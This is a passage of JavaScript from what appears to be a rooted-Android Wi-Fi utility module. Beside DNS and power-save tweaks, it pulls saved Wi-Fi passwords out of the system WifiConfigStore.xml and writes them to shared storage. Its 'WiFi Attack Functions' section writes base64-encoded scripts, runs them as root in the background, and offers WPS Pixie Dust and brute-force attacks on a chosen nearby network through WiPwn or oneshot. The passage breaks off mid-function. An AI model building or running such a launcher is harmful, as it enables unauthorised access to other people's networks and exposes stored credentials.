// wifi.js - Professional UI Theme Adaptation & Layout Overhaul
// Logic 100% Intact. Theme adapted to MTK AI Engine Dark Mode.
(function() {
'use strict';

const CONFIG_DIR = '/sdcard/MTK_AI_Engine/wifi';
const CONFIG_FILE = `${CONFIG_DIR}/wifi_config.json`;
const XML_PATH = '/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml';
const LEGACY_XML_PATH = '/data/misc/wifi/WifiConfigStore.xml';

let availableNetworks = [];
let savedNetworks = {};
let currentNetwork = null;
let currentDNS = null;
let wifiBoosted = false;
let showOnlyFree5GHz = false;
let logInterval = null;
let currentAttackTool = 'wipwn';

const DNS_PROVIDERS = {
    'Cloudflare (Fast & Private)': '1dot1dot1dot1.cloudflare-dns.com',
    'Google Public DNS': 'dns.google',
    'Quad9 (Security Focused)': 'dns.quad9.net',
    'AdGuard (Ad Blocking)': 'dns.adguard.com',
    'Disable Private DNS': 'off'
};

function isNetworkOpen(security) {
    if (!security) return true;
    const secStr = security.toUpperCase();
    return !secStr.includes('WPA') && !secStr.includes('WEP') && !secStr.includes('EAP') && !secStr.includes('PSK') && !secStr.includes('SAE');
}

const execFn = typeof exec === 'function' ? exec : async function(cmd, timeout = 8000) {
    return new Promise(resolve => {
        const cb = `wifi_exec_${Date.now()}_${Math.random().toString(36).substring(2)}`;
        const t = setTimeout(() => { delete window[cb]; resolve(''); }, timeout);
        window[cb] = (_, res) => { clearTimeout(t); delete window[cb]; resolve(res || ''); };
        if (window.ksu) ksu.exec(cmd, `window.${cb}`);
        else { clearTimeout(t); resolve(''); }
    });
};

async function init() {
    const style = document.createElement('style');
    style.textContent = `
        :root {
            --bg-primary: #0d1117;
            --bg-secondary: #161b22;
            --bg-tertiary: #21262d;
            --border-color: rgba(255, 255, 255, 0.08);
            --text-primary: #FFFFFF;
            --text-secondary: rgba(255, 255, 255, 0.6);
            --accent-blue: #4a9eff;
            --accent-green: #32D74B;
            --accent-red: #FF3B30;
            --accent-orange: #FF9F0A;
            --accent-purple: #9b59b6;
        }
        * { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; box-sizing: border-box; }
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.25); }
        input::placeholder { color: rgba(255,255,255,0.4); }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        
        .wifi-modal-box {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 24px;
            box-shadow: 0 24px 64px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.05);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
        }
        .wifi-btn {
            padding: 14px 20px;
            border: none;
            border-radius: 14px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            color: #FFFFFF;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            letter-spacing: 0.2px;
        }
        .wifi-btn:active { transform: scale(0.97); }
        .wifi-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .wifi-btn-primary { background: linear-gradient(135deg, var(--accent-blue), #2980b9); box-shadow: 0 4px 15px rgba(74,158,255,0.25); }
        .wifi-btn-success { background: linear-gradient(135deg, var(--accent-green), #28a745); box-shadow: 0 4px 15px rgba(50,215,75,0.25); }
        .wifi-btn-danger { background: linear-gradient(135deg, var(--accent-red), #c0392b); box-shadow: 0 4px 15px rgba(255,59,48,0.25); }
        .wifi-btn-warning { background: linear-gradient(135deg, var(--accent-orange), #e67e22); box-shadow: 0 4px 15px rgba(255,159,10,0.25); }
        .wifi-btn-purple { background: linear-gradient(135deg, var(--accent-purple), #8e44ad); box-shadow: 0 4px 15px rgba(155,89,182,0.25); }
        .wifi-btn-secondary { background: var(--bg-tertiary); border: 1px solid var(--border-color); }
        .wifi-btn-secondary:hover { background: #2d333b; }
        
        .wifi-card {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 16px;
            transition: all 0.2s ease;
        }
        .wifi-card:hover {
            border-color: var(--accent-blue);
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
        }
        
        .wifi-input {
            width: 100%;
            padding: 14px 16px;
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            color: #FFFFFF;
            border-radius: 12px;
            font-size: 15px;
            outline: none;
            transition: all 0.2s;
        }
        .wifi-input:focus {
            border-color: var(--accent-blue);
            box-shadow: 0 0 0 3px rgba(74,158,255,0.15);
        }
        
        .wifi-select {
            width: 100%;
            padding: 14px 16px;
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            color: #FFFFFF;
            border-radius: 12px;
            font-size: 14px;
            cursor: pointer;
            outline: none;
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='white' viewBox='0 0 16 16'%3E%3Cpath d='M8 11L3 6h10l-5 5z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 16px center;
        }
    `;
    document.head.appendChild(style);

    await createConfigDir();
    await loadSavedPasswordsFromXML();
    await loadSavedNetworks();
    await loadCurrentNetwork();
    await loadCurrentDNS();
    await checkWifiBoostStatus();
    bindClickHandler();
}

async function createConfigDir() {
    try { await execFn(`su -c "mkdir -p ${CONFIG_DIR}"`); } catch (e) {}
}

async function loadSavedPasswordsFromXML() {
    try {
        let xmlFile = XML_PATH;
        const checkLegacy = await execFn(`su -c "test -f ${XML_PATH} && echo exists || echo missing"`);
        if (checkLegacy.trim() === 'missing') {
            xmlFile = LEGACY_XML_PATH;
        }
        const ssidCmd = `su -c "grep 'name=\\\"SSID\\\"' ${xmlFile} 2>/dev/null | sed 's/.*>\\\"\\(.*\\)\\\"<.*/\\1/'"`;
        const pwCmd = `su -c "grep 'name=\\\"PreSharedKey\\\"' ${xmlFile} 2>/dev/null | sed 's/.*>\\\"\\(.*\\)\\\"<.*/\\1/'"`;
        const ssids = (await execFn(ssidCmd)).trim().split('\n').filter(s => s.length > 0);
        const passwords = (await execFn(pwCmd)).trim().split('\n').filter(p => p.length > 0);
        const count = Math.min(ssids.length, passwords.length);
        for (let i = 0; i < count; i++) {
            if (ssids[i] && passwords[i]) {
                savedNetworks[ssids[i]] = passwords[i];
            }
        }
        console.log(`✅ Loaded ${Object.keys(savedNetworks).length} saved networks from XML`);
    } catch (e) {
        console.error("Failed to load from XML: ", e);
    }
}

async function loadSavedNetworks() {
    try {
        const raw = await execFn(`su -c "cat ${CONFIG_FILE} 2>/dev/null"`);
        if (raw.trim()) {
            const localNetworks = JSON.parse(raw);
            savedNetworks = { ...savedNetworks, ...localNetworks };
        }
    } catch (e) {
        console.error('Failed to load local JSON:', e);
    }
}

async function saveNetworks() {
    try {
        const json = JSON.stringify(savedNetworks, null, 2);
        const escapedJson = json.replace(/"/g, '\"').replace(/\n/g, '\n');
        await execFn(`su -c "echo '${escapedJson}' > ${CONFIG_FILE}"`);
    } catch (e) {         
        console.error('Failed to save WiFi config:', e);
    }
}

async function loadCurrentNetwork() {
    try {
        const dump = await execFn('su -c "dumpsys wifi"');
        const ssidMatch = dump.match(/mWifiInfo.*SSID: "([^"]+)"/);
        const bssidMatch = dump.match(/BSSID: ([0-9a-f:]+)/i);
        const freqMatch = dump.match(/Frequency: (\d+)/);
        if (ssidMatch && bssidMatch) {
            currentNetwork = {
                ssid: ssidMatch[1],
                bssid: bssidMatch[1],
                frequency: freqMatch ? parseInt(freqMatch[1]) : 0
            };
            if (currentNetwork.ssid && !savedNetworks[currentNetwork.ssid]) {
                savedNetworks[currentNetwork.ssid] = '[CONNECTED]';
            }
            updateDisplay();
        } else {
            currentNetwork = null;
            updateDisplay();
        }
    } catch (e) { 
        currentNetwork = null; 
        updateDisplay(); 
    }
}

async function loadCurrentDNS() {
    try {
        const modeResult = await execFn('su -c "settings get global private_dns_mode"');
        const mode = modeResult.trim();
        if (mode === 'off' || mode === '') {
            currentDNS = 'off';
        } else if (mode === 'hostname') {
            const specifierResult = await execFn('su -c "settings get global private_dns_specifier"');
            currentDNS = specifierResult.trim();
        }
    } catch (e) {
        console.error('Failed to load DNS:', e);
    }
}

async function checkWifiBoostStatus() {    
    try {
        const statusRes = await execFn('su -c "iw dev wlan0 get power_save"');
        wifiBoosted = statusRes.toLowerCase().includes('power save: off');
        console.log(`⚡ Wi-Fi Boost status: ${wifiBoosted ? 'BOOSTED' : 'NOT BOOSTED'}`);
    } catch (e) {
        console.error('Failed to check boost status:', e);
        wifiBoosted = false;
    }
}

function updateDisplay() {
    const valEl = document.getElementById('wifi-val');
    if (!valEl) return;
    if (currentNetwork) {
        const is5GHz = currentNetwork.frequency >= 5000;
        const band = is5GHz ? '5GHz' : '2.4GHz';
        valEl.innerHTML = `${currentNetwork.ssid} (${band}) <i class="fas ${is5GHz ? 'fa-bolt' : 'fa-wifi'}"></i>`;
        valEl.style.color = is5GHz ? 'var(--accent-green)' : 'var(--accent-orange)';
    } else {
        valEl.innerHTML = 'Not Connected <i class="fas fa-chevron-right"></i>';
        valEl.style.color = 'rgba(255,255,255,0.6)';
    }
}

function updateDNSDisplay() {
    const dnsSelect = document.getElementById('dns-select');
    const dnsStatus = document.getElementById('dns-status');
    if (dnsSelect) {
        if (currentDNS === 'off' || !currentDNS) {
            dnsSelect.value = '';
        } else {
            for (const [name, hostname] of Object.entries(DNS_PROVIDERS)) {
                if (hostname === currentDNS) {
                    dnsSelect.value = name;
                    break;
                }
            }
        }
    }
    if (dnsStatus) {
        if (currentDNS === 'off' || !currentDNS) {
            dnsStatus.innerHTML = '<span style="color: rgba(255,255,255,0.6);">Using default ISP DNS</span>';
        } else {
            const providerName = Object.keys(DNS_PROVIDERS).find(key => DNS_PROVIDERS[key] === currentDNS);
            if (providerName) {
                dnsStatus.innerHTML = `<span style="color: var(--accent-green);">✓ Active: ${providerName}</span>`;
            } else {                
                dnsStatus.innerHTML = `<span style="color: var(--accent-green);">✓ Active: Custom (${currentDNS})</span>`;                
            }
        }
    }
}

function updateBoostDisplay() {
    const boostBtn = document.getElementById('boost-btn');
    const boostStatus = document.getElementById('boost-status');
    if (boostBtn) {
        if (wifiBoosted) {
            boostBtn.innerHTML = '⚡ Wi-Fi Boosted ✓';
            boostBtn.className = 'wifi-btn wifi-btn-success';
        } else {
            boostBtn.innerHTML = '⚡ Enable Wi-Fi Boost';
            boostBtn.className = 'wifi-btn wifi-btn-secondary';
        }
    }
    if (boostStatus) {
        if (wifiBoosted) {
            boostStatus.innerHTML = '<span style="color: var(--accent-green);">✓ Power Save: OFF (Optimized)</span>';
        } else {
            boostStatus.innerHTML = '<span style="color: rgba(255,255,255,0.6);">Power Save: ON (Battery Mode)</span>';
        }
    }
}

function bindClickHandler() {
    const item = document.getElementById('wifi-item');
    if (!item) return;
    item.style.cursor = 'pointer';
    item.addEventListener('click', async () => {
        showNetworkSelector();
        const scanBtn = document.getElementById('auto-scan-btn');
        if (scanBtn) scanBtn.click();
    });
}

async function scanNetworks() {
    try {
        if (typeof showStatus === 'function') showStatus('Scanning WiFi networks...', 'var(--accent-blue)');
        await execFn('svc wifi enable');
        await execFn('su -c "cmd wifi start-scan"');
        await new Promise(resolve => setTimeout(resolve, 4000));
        const scan = await execFn('su -c "cmd wifi list-scan-results"');
        const lines = scan.trim().split('\n');
        availableNetworks = [];        
        const seenSSIDs = new Set();            
        lines.forEach(line => {
            if (!line.trim() || line.includes('BSSID') || line.includes('FREQUENCY')) return;
            let ssid = null, frequency = 0, signal = -75, bssid = null, security = 'Open';
            const standardMatch = line.match(/([0-9a-f:]{17})\s+(\d{4,5})\s+(-?\d+)\s+(.+?)\s+(\[.+\])/);
            if (standardMatch) {
                bssid = standardMatch[1];
                frequency = parseInt(standardMatch[2]);
                signal = parseInt(standardMatch[3]);
                ssid = standardMatch[4].trim().replace(/^>?\d+\.\d+\s+/, '').replace(/^"|"$/g, '');
                security = standardMatch[5];
            }
            if (!ssid) {
                const ssidMatch = line.match(/\d{4,5}\s+(?:-?\d+\s+)?(?:[\d.]+\s+)?([^\[\]]+?)(?=\s*\[|$)/);
                if (ssidMatch) {
                    ssid = ssidMatch[1].trim().replace(/^>?\d+\.\d+\s+/, '').replace(/^"|"$/g, '');
                }
            }
            if (!frequency) {
                const freqMatch = line.match(/(\d{4,5})\s*MHz/);
                if (freqMatch) frequency = parseInt(freqMatch[1]);
            }
            if (!bssid) {
                const bssidMatch = line.match(/([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})/i);
                if (bssidMatch) bssid = bssidMatch[1];
            }
            if (ssid && frequency > 0 && !seenSSIDs.has(ssid) && ssid.length > 0 && ssid.length < 33) {
                seenSSIDs.add(ssid);
                availableNetworks.push({ 
                    ssid, 
                    bssid: bssid || '',
                    frequency, 
                    signal, 
                    security, 
                    hasPassword: !!savedNetworks[ssid] 
                });
            }
        });
        availableNetworks.sort((a, b) => {
            if ((a.frequency >= 5000) && (b.frequency < 5000)) return -1;
            if ((a.frequency < 5000) && (b.frequency >= 5000)) return 1;
            return b.signal - a.signal;
        });
        if (typeof showStatus === 'function') {
            const free5gCount = availableNetworks.filter(n => n.frequency >= 5000 && isNetworkOpen(n.security)).length;
            let statusMsg = `✅ Found ${availableNetworks.length} networks`;
            if (free5gCount > 0) statusMsg += ` (${free5gCount} Free 5GHz)`;
            showStatus(statusMsg, 'var(--accent-green)');
        }
    } catch (e) { 
        console.error('Scan failed:', e); 
        if (typeof showStatus === 'function') showStatus('❌ Scan failed', 'var(--accent-red)');
    }
}

async function checkAndToggleWifiBoost() {
    const boostBtn = document.getElementById('boost-btn');
    const boostStatus = document.getElementById('boost-status');
    if (boostBtn) {
        boostBtn.disabled = true;
        boostBtn.innerHTML = '⏳ Checking...';
    }
    try {
        const statusRes = await execFn('su -c "iw dev wlan0 get power_save"');
        const isOff = statusRes.toLowerCase().includes('power save: off');
        if (isOff) {
            wifiBoosted = true;
            if (boostStatus) boostStatus.innerHTML = '<span style="color: var(--accent-green);">✓ Already Boosted (Power Save OFF)</span>';
            if (typeof showStatus === 'function') showStatus('✅ Wi-Fi is already boosted', 'var(--accent-green)');
        } else {
            if (boostStatus) boostStatus.innerHTML = '<span style="color: var(--accent-orange);">⚡ Applying boost...</span>';
            if (typeof showStatus === 'function') showStatus('⚡ Boosting Wi-Fi...', 'var(--accent-orange)');
            await execFn('su -c "cmd wifi force-hi-perf-mode enabled"');
            await execFn('su -c "cmd wifi force-low-latency-mode enabled"');
            await execFn('su -c "iw dev wlan0 set power_save off"');
            await execFn('su -c "iw phy phy0 set retry short 7 long 7"');
            await execFn('su -c "ifconfig wlan0 txqueuelen 100"');
            await execFn('su -c "cmd wifi set-poll-rssi-interval-msecs 1000"');
            await execFn('su -c "cmd wifi set-wifi-sleep-policy never"');
            await execFn('su -c "settings put global wifi_sleep_policy 0"');
            await execFn('su -c "cmd wifi set-roaming-scan-interval 30"');
            await execFn('su -c "settings put global wifi_watchdog_poor_network_test_enabled 0"');
            await execFn('su -c "settings put global wifi_watchdog_ap_count 10"');
            await execFn('su -c "settings put global wifi_watchdog_max_ap_checks 3"');
            await execFn('su -c "settings put global wifi_framework_enabled 1"');
            await execFn('su -c "cmd wifi reassociate"');
            await execFn('su -c "echo Y > /sys/module/wlan/parameters/ps || true"');
            await execFn('su -c "echo 1 > /sys/module/wlan/parameters/wlm || true"');
            await new Promise(resolve => setTimeout(resolve, 1000));
            const verifyRes = await execFn('su -c "iw dev wlan0 get power_save"');
            if (verifyRes.toLowerCase().includes('power save: off')) {
                wifiBoosted = true;
                if (boostStatus) boostStatus.innerHTML = '<span style="color: var(--accent-green);">✓ Boost Applied Successfully!</span>';
                if (typeof showStatus === 'function') showStatus('✅ Wi-Fi Boosted Successfully!', 'var(--accent-green)');
            } else {
                if (boostStatus) boostStatus.innerHTML = '<span style="color: var(--accent-orange);">⚠️ Command ran, but kernel may have overridden it</span>';
                if (typeof showStatus === 'function') showStatus('⚠️ Boost may not be active', 'var(--accent-orange)');
            }
        }
        updateBoostDisplay();
    } catch (e) {
        if (boostStatus) boostStatus.innerHTML = '<span style="color: var(--accent-red);">❌ Error checking boost status</span>';
        if (typeof showStatus === 'function') showStatus('❌ Error: Kernel may restrict iw commands', 'var(--accent-red)');
        console.error(e);
    } finally {
        if (boostBtn) {
            boostBtn.disabled = false;
            updateBoostDisplay();
        }
    }
}

async function disable24GHz() {
    const bandBtn = document.getElementById('disable-24g-btn');
    if (bandBtn) {
        bandBtn.disabled = true;
        bandBtn.textContent = '⏳ Applying system-wide...';
    }
    if (typeof showStatus === 'function') showStatus('⚙️ Disabling 2.4GHz across all layers...', 'var(--accent-purple)');
    try {
        await execFn('su -c "cmd wifi set-band-preference 5ghz"');
        await execFn('su -c "settings put global wifi_band_preferred 2"');
        await execFn('su -c "settings put global preferred_network_mode 5ghz"');
        await execFn('su -c "settings put secure wifi_band 2"');
        await execFn('su -c "iw dev wlan0 set freq 5180 || true"');
        await execFn('su -c "echo 5 > /proc/net/wlan/band || true"');
        await execFn('su -c "echo 5G_ONLY > /proc/net/wlan/band_mode || true"');
        await execFn('su -c "echo 1 > /proc/net/wlan/disable_2g || true"');
        await execFn('su -c "echo 0 > /sys/module/wlan/parameters/g_mode || true"');
        await execFn('su -c "echo 5 > /sys/module/wlan/parameters/band || true"');
        await execFn('su -c "echo 1 > /sys/module/qca_cld3_wlan/parameters/g_mode || true"');
        await execFn('su -c "cmd wifi disconnect"');
        await new Promise(r => setTimeout(r, 1000));
        await execFn('su -c "svc wifi disable"');
        await new Promise(r => setTimeout(r, 1500));        
        await execFn('su -c "svc wifi enable"');
        await new Promise(r => setTimeout(r, 2000));
        if (typeof showStatus === 'function') showStatus('✅ 2.4GHz Disabled (5GHz Only Mode Active)', 'var(--accent-green)');
    } catch (e) {
        console.error('Failed to disable 2.4GHz:', e);
        if (typeof showStatus === 'function') showStatus('⚠️ Some commands failed, but 5GHz preference set', 'var(--accent-orange)');
    } finally {
        if (bandBtn) {
            bandBtn.disabled = false;
            bandBtn.textContent = '✅ 5GHz System Active';
            setTimeout(() => { bandBtn.textContent = '📶 Disable 2.4GHz (System)'; }, 4000);
        }
    }
}

async function setGlobalDNS(providerName) {
    const hostname = DNS_PROVIDERS[providerName];
    if (!hostname) return;
    const dnsSelect = document.getElementById('dns-select');
    const dnsStatus = document.getElementById('dns-status');
    if (dnsSelect) dnsSelect.disabled = true;
    if (dnsStatus) dnsStatus.innerHTML = '<span style="color: var(--accent-blue);">⏳ Applying DNS...</span>';
    try {
        if (hostname === 'off') {
            await execFn('su -c "settings put global private_dns_mode off"');
            currentDNS = 'off';
            if (dnsStatus) dnsStatus.innerHTML = '<span style="color: var(--accent-green);">✓ Private DNS disabled</span>';
            if (typeof showStatus === 'function') showStatus('✅ Using default ISP DNS', 'var(--accent-green)');
        } else {
            await execFn('su -c "settings put global private_dns_mode hostname"');
            await execFn(`su -c "settings put global private_dns_specifier ${hostname}"`);
            currentDNS = hostname;
            if (dnsStatus) dnsStatus.innerHTML = `<span style="color: var(--accent-green);">✓ ${providerName} applied</span>`;
            if (typeof showStatus === 'function') showStatus(`✅ ${providerName} DNS applied!`, 'var(--accent-green)');
        }
        updateDNSDisplay();        
    } catch (e) {
        if (dnsStatus) dnsStatus.innerHTML = '<span style="color: var(--accent-red);">❌ Failed to apply DNS</span>';
        if (typeof showStatus === 'function') showStatus('❌ Failed to apply DNS', 'var(--accent-red)');
        console.error(e);
        if (dnsSelect) dnsSelect.value = '';
    } finally {
        if (dnsSelect) dnsSelect.disabled = false;
    }
}

// --- WiFi Attack Functions ---
function b64EncodeUnicode(str) {
    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
        return String.fromCharCode(parseInt(p1, 16));
    }));
}

function stripAnsiCodes(str) {
    return str.replace(/\x1b[[0-9;]*m/g, '');
}

async function getTermuxUid() {
    try {
        const res = await execFn('su -c "stat -c %U /data/data/com.termux"');
        return res.trim();
    } catch (e) { return null; }
}

async function runTermuxCommand(command, logFile = null, jobMarker = null) {
    const user = await getTermuxUid();
    if (!user) throw new Error("Could not get Termux user. Is Termux installed?");
    const env = `export HOME=/data/data/com.termux/files/home; export PREFIX=/data/data/com.termux/files/usr; export LD_PRELOAD=/data/data/com.termux/files/usr/lib/libtermux-exec.so; export PATH=$PREFIX/bin:$PATH; export TMPDIR=$PREFIX/tmp; export LANG=en_US.UTF-8; `;
    let redirection = "";
    if (logFile) redirection = `> ${logFile} 2>&1`;
    const fullScript = `#!/system/bin/sh\n${env}\n${command} ${redirection}\n`;
    const b64Script = b64EncodeUnicode(fullScript);
    const scriptPath = "/sdcard/MTK_AI_Engine/wifi/termux_script.sh";
    const writeCmd = `echo "${b64Script}" | base64 -d > ${scriptPath} && chmod 777 ${scriptPath}`;
    await execFn(`su -c "${writeCmd}"`);
    const markerArg = jobMarker ? jobMarker : "";
    const execCmd = `su -c "su ${user} -c 'nohup ${scriptPath} ${markerArg} > /dev/null 2>&1 &'"`;
    return await execFn(execCmd);
}

async function checkTermuxInstalled() {
    try {
        const res = await execFn('su -c "pm path com.termux"');
        return res.includes('package:');
    } catch (e) { return false; }
}

async function checkWipwnInstalled() {
    try {
        const res = await execFn('su -c "test -f /data/data/com.termux/files/home/wipwn/main.py && echo yes || echo no"');
        return res.trim() === 'yes';
    } catch (e) { return false; }
}

async function checkoneshotInstalled() {
    try {
        const res = await execFn('su -c "test -f /data/data/com.termux/files/home/ose/ose.py && echo yes || (test -f /data/data/com.termux/files/home/ose/ose.py && echo yes || echo no)"');
        return res.trim() === 'yes';
    } catch (e) { return false; }
}

function startLogReader(logFile, elementId) {
    if (logInterval) clearInterval(logInterval);
    logInterval = setInterval(async () => {
        try {
            const rawContent = await execFn(`su -c "cat ${logFile} 2>/dev/null"`);
            const cleanContent = stripAnsiCodes(rawContent);
            const el = document.getElementById(elementId);
            if (el) {
                el.textContent = cleanContent || 'Waiting for logs...';
                el.scrollTop = el.scrollHeight;
            }
        } catch (err) {
            console.error("Log reader error:", err);
        }
    }, 1000);
}

function stopLogReader() {
    if (logInterval) {        
        clearInterval(logInterval);
        logInterval = null;
    }
}

async function showAttackModal(network) {
    const existing = document.getElementById('attack-modal');
    if (existing) existing.remove();
    stopLogReader();
    
    const modal = document.createElement('div');
    modal.id = 'attack-modal';
    modal.style.cssText = `position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 10002; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); animation: fadeIn 0.2s ease;`;
    
    const box = document.createElement('div');
    box.className = 'wifi-modal-box';
    box.style.cssText = `padding: 28px; width: 92%; max-width: 600px; max-height: 88vh; overflow-y: auto; animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1);`;
    
    const title = document.createElement('h3');
    title.textContent = `⚔️ Attack WiFi: ${network.ssid}`;
    title.style.cssText = 'color: #FFFFFF; margin: 0 0 8px; font-size: 22px; font-weight: 700; text-align: center; letter-spacing: -0.5px;';
    
    const macInfo = document.createElement('div');
    macInfo.style.cssText = 'color: rgba(255,255,255,0.6); font-size: 13px; margin-bottom: 24px; text-align: center;';
    macInfo.innerHTML = `<strong>MAC Address:</strong> <span style="color: var(--accent-blue); font-family: monospace;">${network.bssid || 'Unknown'}</span>`;
    
    const content = document.createElement('div');
    content.id = 'attack-content';
    content.innerHTML = '<div style="color: rgba(255,255,255,0.6); text-align: center; padding: 20px;">Checking environment...</div>';
    
    const logContainer = document.createElement('div');
    logContainer.style.cssText = 'margin-top: 24px; display: none;';
    logContainer.innerHTML = `
        <div style="color: #FFFFFF; font-size: 14px; font-weight: 600; margin-bottom: 10px; display:flex; align-items:center; gap:8px;">
            <span>📜</span> Live Logs
        </div>
        <pre id="attack-log" style="background: var(--bg-primary); color: var(--accent-green); padding: 16px; border-radius: 12px; height: 220px; overflow-y: auto; font-size: 12px; white-space: pre-wrap; word-break: break-all; border: 1px solid var(--border-color); font-family: monospace; margin: 0;">Waiting for logs...</pre>
        <button id="stop-attack-btn" class="wifi-btn wifi-btn-danger" style="width: 100%; margin-top: 12px; display: none;">⏹️ Stop Attack / Setup</button>
    `;
    
    const closeBtn = document.createElement('button');
    closeBtn.textContent = 'Close';
    closeBtn.className = 'wifi-btn wifi-btn-secondary';
    closeBtn.style.cssText = `width: 100%; margin-top: 16px;`;
    closeBtn.onclick = () => {
        stopLogReader();
        modal.remove();
    };
    
    box.append(title, macInfo, content, logContainer, closeBtn);
    modal.appendChild(box);
    modal.onclick = e => { if (e.target === modal) { stopLogReader(); modal.remove(); } };
    document.body.appendChild(modal);
    
    const termuxInstalled = await checkTermuxInstalled();    
    if (!termuxInstalled) { 
        content.innerHTML = `
            <div style="text-align: center; padding: 20px 0;">
                <div style="font-size: 48px; margin-bottom: 16px;">📦</div>
                <div style="color: #FFFFFF; font-size: 18px; font-weight: 700; margin-bottom: 12px;">Termux Not Installed</div>
                <div style="color: rgba(255,255,255,0.6); font-size: 14px; margin-bottom: 24px; line-height: 1.5;">To perform WiFi attacks, you need to install Termux first.</div>
                <a href="https://github.com/termux/termux-app/releases/download/v0.118.3/termux-app_v0.118.3+github-debug_universal.apk" target="_blank" class="wifi-btn wifi-btn-primary" style="text-decoration: none; display: inline-flex; margin-bottom: 16px;">
                    📥 Download Termux APK
                </a>
                <div style="color: rgba(255,255,255,0.5); font-size: 12px; margin-top: 16px;">
                    After installing, open Termux, type <code style="background:var(--bg-tertiary); color:#FFFFFF; padding:4px 8px; border-radius:6px; border:1px solid var(--border-color);">su</code> and grant root access.
                </div>
            </div>
        `;
        return;
    }
    
    const wipwnInstalled = await checkWipwnInstalled();
    const oneshotInstalled = await checkoneshotInstalled();
    
    if (!wipwnInstalled && !oneshotInstalled) {
        content.innerHTML = `
            <div style="text-align: center; padding: 20px 0;">
                <div style="font-size: 48px; margin-bottom: 16px;">⚙️</div>
                <div style="color: #FFFFFF; font-size: 18px; font-weight: 700; margin-bottom: 12px;">Setup Required</div>
                <div style="color: rgba(255,255,255,0.6); font-size: 14px; margin-bottom: 24px;">Choose a tool to install:</div>
                <div style="display: flex; flex-direction: column; gap: 12px;">
                    <button id="setup-wipwn-btn" class="wifi-btn wifi-btn-success">⚙️ Setup WiPwn</button>
                    <button id="setup-oneshot-btn" class="wifi-btn wifi-btn-purple">🛠️ Setup oneshot</button>
                </div>
            </div>
        `;
        document.getElementById('setup-wipwn-btn').onclick = () => runSetup(network, 'wipwn');
        document.getElementById('setup-oneshot-btn').onclick = () => runSetup(network, 'oneshot');
        return;
    }
    
    if (wipwnInstalled && !oneshotInstalled) currentAttackTool = 'wipwn';
    if (!wipwnInstalled && oneshotInstalled) currentAttackTool = 'oneshot';
    
    let toolSelectorHtml = '';
    if (wipwnInstalled && oneshotInstalled) {
        toolSelectorHtml = `
            <div style="margin-bottom: 20px; display: flex; justify-content: center; gap: 10px; background: var(--bg-tertiary); padding: 6px; border-radius: 12px; border: 1px solid var(--border-color);">
                <button id="tool-wipwn" class="wifi-btn ${currentAttackTool === 'wipwn' ? 'wifi-btn-success' : 'wifi-btn-secondary'}" style="flex:1; padding: 10px;">WiPwn</button>
                <button id="tool-oneshot" class="wifi-btn ${currentAttackTool === 'oneshot' ? 'wifi-btn-purple' : 'wifi-btn-secondary'}" style="flex:1; padding: 10px;">oneshot</button>
            </div>
        `;
    }
    
    let installMissingHtml = '';    
    if (wipwnInstalled && !oneshotInstalled) {
        installMissingHtml = `
            <div style="margin-bottom: 20px; text-align: center;">
                <button id="install-oneshot-btn" class="wifi-btn wifi-btn-secondary" style="border-color: var(--accent-purple); color: var(--accent-purple);">📥 Install oneshot</button>
            </div>
        `;
    } else if (!wipwnInstalled && oneshotInstalled) {
        installMissingHtml = `
            <div style="margin-bottom: 20px; text-align: center;">
                <button id="install-wipwn-btn" class="wifi-btn wifi-btn-secondary" style="border-color: var(--accent-green); color: var(--accent-green);">📥 Install WiPwn</button>
            </div>
        `;
    }
    
    content.innerHTML = `
        ${toolSelectorHtml}
        ${installMissingHtml}
        <div style="text-align: center; padding: 20px 0;">
            <div style="font-size: 48px; margin-bottom: 16px;">🎯</div>
            <div style="color: #FFFFFF; font-size: 18px; font-weight: 700; margin-bottom: 20px;">Ready to Attack (${currentAttackTool === 'wipwn' ? 'WiPwn' : 'oneshot'})</div>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                <button id="pixie-btn" class="wifi-btn wifi-btn-purple" style="padding: 18px; font-size: 15px;">✨ Pixie Dust</button>
                <button id="brute-btn" class="wifi-btn wifi-btn-warning" style="padding: 18px; font-size: 15px;">🔨 Brute Force</button>
            </div>
        </div>
    `;
    
    if (wipwnInstalled && oneshotInstalled) {
        document.getElementById('tool-wipwn').onclick = () => { currentAttackTool = 'wipwn'; showAttackModal(network); };
        document.getElementById('tool-oneshot').onclick = () => { currentAttackTool = 'oneshot'; showAttackModal(network); };
    }
    
    if (wipwnInstalled && !oneshotInstalled) {
        document.getElementById('install-oneshot-btn').onclick = () => runSetup(network, 'oneshot');
    } else if (!wipwnInstalled && oneshotInstalled) {
        document.getElementById('install-wipwn-btn').onclick = () => runSetup(network, 'wipwn');
    }
    
